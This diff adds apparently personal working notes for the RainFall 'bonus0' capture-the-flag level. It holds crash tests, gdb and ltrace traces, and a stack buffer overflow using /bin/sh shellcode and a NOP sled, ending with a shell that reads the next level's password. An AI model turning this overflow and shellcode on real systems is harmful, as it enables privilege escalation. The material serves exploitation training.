@@ -214,3 +214,469 @@ python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x
 bonus0@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'a' * 4072 + '\xf8\x98\x04\x08' + ' a'" | ./bonus0
  - 
 Segmentation fault (core dumped)
+
+
+bonus0@RainFall:~$ ./bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaaaa 
+aaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaa
+
+ax19
+ax18
+no segfault
+
+
+bonus0@RainFall:~$ ./bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaaaa 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+
+ax20
+ax18
+segfault
+
+bonus0@RainFall:~$ ./bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaaa  
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+
+ax20
+ax17
+segfault
+
+bonus0@RainFall:~$ ./bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaa    
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa
+
+ax20
+ax16
+no segfault
+
+---
+37 ou + segfault
+---
+
+
+(gdb) r
+Starting program: /home/user/bonus0/bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaaa   
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e40061 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) where
+#0  0xb7e40061 in ?? () from /lib/i386-linux-gnu/libc.so.6
+Cannot access memory at address 0x61616165
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaaaa  
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00616161 in ?? ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaaaaa 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0 
+ - 
+aaaaaaaaaaaaaaaaaaaa
+ - 
+aaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��� aaaaaaaaaaaaaaaaaaaa���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+
+
+
+
+
+
+s = 0
+s = strcpy(ax20)
+s = ax20 + ' ' + \0
+s = ax20 + ' ' + strcat (ax17-20)
+s = ax20 + ' ' ax17 = 38-41
+
+56 - 4
+52 - 38
+14
+
+esp = epb - ? - 64
+
+\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+21
+
+[4 address to shellcode A] + [11 shellcode A] [4 address to shellcode B] [11 shellcode B]
+
+[4 address to shellcode A] + [16 shellcode A] [5 shellcode B]
+
+bonus0@RainFall:~$ ltrace ./bonus0 
+__libc_start_main(0x80485a4, 1, 0xbffff804, 0x80485d0, 0x8048640 <unfinished ...>
+puts(" - " - 
+)                                                     = 4
+read(0, aaaaaaaaaaaaaaaaaaaa
+"aaaaaaaaaaaaaaaaaaaa\n", 4096)                         = 21
+strchr("aaaaaaaaaaaaaaaaaaaa\n", '\n')                          = "\n"
+strncpy(0xbffff6e8, "aaaaaaaaaaaaaaaaaaaa", 20)                 = 0xbffff6e8
+puts(" - " - 
+)                                                     = 4
+read(0, aaaaaaaaaaaaaaaa    
+"aaaaaaaaaaaaaaaa\n", 4096)                             = 17
+strchr("aaaaaaaaaaaaaaaa\naaa", '\n')                           = "\naaa"
+strncpy(0xbffff6fc, "aaaaaaaaaaaaaaaa", 20)                     = 0xbffff6fc
+strcpy(0xbffff736, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)       = 0xbffff736
+strcat("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., "aaaaaaaaaaaaaaaa") = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...
+puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa
+)                     = 54
++++ exited (status 0) +++
+bonus0@RainFall:~$ ltrace ./bonus0 
+__libc_start_main(0x80485a4, 1, 0xbffff804, 0x80485d0, 0x8048640 <unfinished ...>
+puts(" - " - 
+)                                                     = 4
+read(0, aaaaaaaaaaaaaaaaaaaa
+"aaaaaaaaaaaaaaaaaaaa\n", 4096)                         = 21
+strchr("aaaaaaaaaaaaaaaaaaaa\n", '\n')                          = "\n"
+strncpy(0xbffff6e8, "aaaaaaaaaaaaaaaaaaaa", 20)                 = 0xbffff6e8
+puts(" - " - 
+)                                                     = 4
+read(0, aaaaaaaaaaaaaaaaa   
+"aaaaaaaaaaaaaaaaa\n", 4096)                            = 18
+strchr("aaaaaaaaaaaaaaaaa\naa", '\n')                           = "\naa"
+strncpy(0xbffff6fc, "aaaaaaaaaaaaaaaaa", 20)                    = 0xbffff6fc
+strcpy(0xbffff736, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)       = 0xbffff736
+strcat("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., "aaaaaaaaaaaaaaaaa") = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...
+puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaa
+)                     = 56
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+[4 address to shellcode] + [16 padding] + [21 shellcode]
+[4 address to shellcode] + [16 padding]
+
+aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb���
+aaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbc
+
+
+aaaaaaaaaaaaaaaaaaaa
+bbbbccccddddeeeeffff
+
+
+aaaaaaaaaaaaaaaaaaaa bbbbccccddddeeeeffff
+
+
+aaaabbbbccccddddeeee ffffgggghhhhiAAAAjjj
+
+aaaabbbbccccddddeeee ffffgggghhhhiiiijjjj
+
+                                                      [eip]
+aaaabbbbccccddddeeeeffffgggghhhhiiAAAAj ffffgggghhhhiiAAAAj
+aaaabbbbccccddddeeeeffffgggghhhhiiAAAAjj��� ffffgggghhhhiiAAAAjj���
+[padding 54][eip]
+
+aaaabbbbccccddddeeee
+ffffgggghhhhiiAAAAj
+
+aaaabbbbccccddddeeee
+ffffgggghhhhiiiijjjjkkkkkkkkkkkkkkAAAA���
+
+
+pp () p(arg1), arg1 = 20 -> pas de \0 (\n remplace \0 mais en dehors du strncpy(20))
+pp () p(arg2), arg2 = 19 -> \n remplacer par \0
+pp () strcpy (s, arg1) -> arg1 pas de \0 + arg1 et arg2 cote a cote dans la stack, strcpy arg1 + arg2 (atteint \0 de arg2)
+[s = 20 + 19 = 39]
+pp () s[max] = ' ' & s[max + 1] = \0
+pp () strcat (s, arg2) -> s = [arg1 + arg2 + ' '] + [arg2]
+[s = 20 + 19 + 1 + 19 = 59]
+
+stack [local][old_epb][ eip ][random]
+s     [0-53          ][54-58][59]
+
+aaaabbbbccccddddeeee  [20]
+ffffgggghhhhiiAAAAj   [19]
+
+[shellcode A 1-20 20]                                   [20]
+[shellcode B 21 1][padding 13][address s 4][padding 1]  [19]
+
+
+\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd
+\x80
+
+python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd'"
+python -c "print '\x80' + 'a' * 13 + 'address' + 'a'"
+
+
+local3a = 0xbffff706
+
+0xbffff706
+\x06\xf7\xff\xff
+
+python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd'"
+python -c "print '\x80' + 'a' * 13 + '\x06\xf7\xff\xff' + 'a'"
+
+
+python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd'"; python -c "print '\x80' + 'a' * 13 + '\x06\xf7\xff\xff' + 'a'" | ./bonus0
+
+NOP - nop instruction asm -> go next
+\x90
+
+python -c "print '\x90' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b'"
+python -c "print '\xcd\x80' + 'a' * 12 + '\x06\xf7\xff\xff' + 'a'"
+
+python -c "print '\x90' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b'"; python -c "print '\xcd\x80' + 'a' * 12 + '\x06\xf7\xff\xff' + 'a'" | ./bonus0
+
+
+python -c "print '\x90' * 4095 + '\n'"
+
+
+python -c "print `\x90 * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"
+
+                                                      [eip]
+aaaabbbbccccddddeeeeffffgggghAAAAhhhiiii��� ffffgggghAAAAhhhiiii���
+
+aaaabbbbccccddddeeee
+ffffgggghAAAAhhhiiii
+
+
+python -c "print '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"
+0xbffff6b8
+\xb8\x6b\xff\xff
+0xbfffe6a0
+\xa0\x6e\xff\xff
+
+python -c "print '\x90' * 9 + '\xb8\x6b\xff\xff'"
+
+
+(python -c "print '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; sleep 1; python -c "print '\x90' * 9 + '\xb8\x6b\xff\xff'") | ./bonus0
+
+Breakpoint 2, 0x080484e1 in p ()
+(gdb) x $eax
+0xbfffe680:	0x00000000
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080485a4 <+0>:	push   %ebp
+   0x080485a5 <+1>:	mov    %esp,%ebp
+   0x080485a7 <+3>:	and    $0xfffffff0,%esp
+   0x080485aa <+6>:	sub    $0x40,%esp
+   0x080485ad <+9>:	lea    0x16(%esp),%eax
+   0x080485b1 <+13>:	mov    %eax,(%esp)
+   0x080485b4 <+16>:	call   0x804851e <pp>
+   0x080485b9 <+21>:	lea    0x16(%esp),%eax
+   0x080485bd <+25>:	mov    %eax,(%esp)
+   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
+   0x080485c5 <+33>:	mov    $0x0,%eax
+   0x080485ca <+38>:	leave  
+   0x080485cb <+39>:	ret    
+End of assembler dump.
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484b4 <+0>:	push   %ebp
+   0x080484b5 <+1>:	mov    %esp,%ebp
+   0x080484b7 <+3>:	sub    $0x1018,%esp
+   0x080484bd <+9>:	mov    0xc(%ebp),%eax
+   0x080484c0 <+12>:	mov    %eax,(%esp)
+   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
+   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
+   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
+   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
+   0x080484da <+38>:	movl   $0x0,(%esp)
+=> 0x080484e1 <+45>:	call   0x8048380 <read@plt>
+   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
+   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
+   0x080484f4 <+64>:	mov    %eax,(%esp)
+   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
+   0x080484fc <+72>:	movb   $0x0,(%eax)
+   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
+   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
+   0x0804850d <+89>:	mov    %eax,0x4(%esp)
+   0x08048511 <+93>:	mov    0x8(%ebp),%eax
+   0x08048514 <+96>:	mov    %eax,(%esp)
+   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
+   0x0804851c <+104>:	leave  
+   0x0804851d <+105>:	ret    
+End of assembler dump.
+(gdb) x/40x 0xbfffe680
+0xbfffe680:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe690:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe700:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe710:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) ni
+a
+0x080484e6 in p ()
+(gdb) x/40x 0xbfffe680
+0xbfffe680:	0x00000a61	0x00000000	0x00000000	0x00000000
+0xbfffe690:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe700:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe710:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
+
+python -c "print '\x90' * 9 + '\xa0\x6e\xff\xff'"
+(python -c "print '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; sleep 1; python -c "print '\x90' * 9 + '\xa0\x6e\xff\xff'") | ./bonus0
+
+
+0xbfffe710
+\x10\xe7\xff\xbf
+
+(python -c "print '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; sleep 1; python -c "print '\x90' * 9 + '\x10\xe7\xff\xbf'") | ./bonus0
+
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+bbbbbbbbbAAAA
+
+(gdb) x/300x 0xbfffe680
+0xbfffe680:	0x62626262	0x62626262	0x41414162	0x61610a41
+0xbfffe690:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe6a0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe6b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe6c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe6d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe6e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe6f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe700:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe710:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe720:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe730:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe740:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe750:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe760:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe770:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe780:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe790:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe7a0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe7b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe7c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe7d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe7e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe7f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe800:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe810:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe820:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe830:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe840:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe850:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe860:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe870:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe880:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe890:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe8a0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe8b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe8c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe8d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe8e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe8f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe900:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe910:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe920:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe930:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe940:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe950:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe960:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe970:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe980:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe990:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe9a0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe9b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe9c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe9d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe9e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffe9f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea00:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea10:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea20:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea30:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea40:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea50:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea60:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea70:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea80:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffea90:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffeaa0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffeab0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbfffeac0:	0x00000061	0x00000000	0x00000000	0x00000000
+0xbfffead0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffeae0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffeaf0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffeb00:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffeb10:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffeb20:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
+0xbfffe68e
+\x8e\xe6\xff\xbf
+
+0xbfffe780
+\x80\xe7\xff\xbf
+
+0xbfffe690
+\x90\xe6\xff\xbf
+
+0xbfffe6a0
+\xa0\xe6\xff\xbf
+
+0xbfffe790
+\x90\xe7\xff\xbf
+
+0xbfffe6f0
+\xf0\xe6\xff\xbf
+
+0xbfffe6c0
+\xc0\xe6\xff\xbf
+
+0xbfffe6c5
+\xc5\xe6\xff\xbf
+
+(python -c "print '\x90' * 1000 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; sleep 1; python -c "print 'a' * 9 + '\x90\xe7\xff\xbf' + 'a' * 7"); cat  | ./bonus0
+
+bonus0@RainFall:~$ (python -c "print '\x90' * 1000 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; sleep 1; python -c "print 'a' * 9 + '\xc5\xe6\xff\xbf' + 'a' * 7"; cat)  | ./bonus0
+ - 
+ - 
+��������������������aaaaaaaaa����aaaaaaa��� aaaaaaaaa����aaaaaaa���
+id
+uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+exit
